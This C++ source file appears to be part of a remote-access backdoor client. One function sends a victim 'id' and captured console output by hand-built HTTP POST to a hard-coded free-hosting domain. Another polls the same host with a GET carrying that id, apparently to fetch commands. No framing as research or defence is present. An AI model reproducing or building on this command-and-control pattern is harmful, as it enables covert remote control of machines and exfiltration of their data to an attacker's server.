#include "addition.h"


void sendConsoleOutput(SOCKET *sock, char * output, char *id)
{
    // printf("sendConsoleOutput\n");

    char *request = nullptr;
    request = mySTL::addStr(request, "POST / HTTP/1.1\r\n"
                                     "Host: gc9515.000webhostapp.com\r\n"
                                     "Connection: close\r\n"
                                     "Content-Type: application/x-www-form-urlencoded\r\n"
                                     "Content-Length: ");
    request = mySTL::addStr( request, mySTL::itoa( strlen(output)
                                                   +strlen(id)
                                                   +13 ) );
    request = mySTL::addStr(request, "\r\n"
                                     "\r\n"
                                     "id=");
    request = mySTL::addStr(request, id);
    request = mySTL::addStr(request, "&output=");
    request = mySTL::addStr(request, output);
    request = mySTL::addStr(request, "\r\n");
    send(*sock, request, strlen(request), 0);
    printf("%s\n", request);
}



void sendRequest(SOCKET *sock, char *id)
{
    char *request = nullptr;
    request = mySTL::addStr(request, "GET /?id=");
    request = mySTL::addStr(request, id);
    request = mySTL::addStr(request, " HTTP/1.1\r\n"
                                     "Host: gc9515.000webhostapp.com\r\n"
                                     "\r\n"
                            );
    send(*sock, request, strlen(request), 0);
}

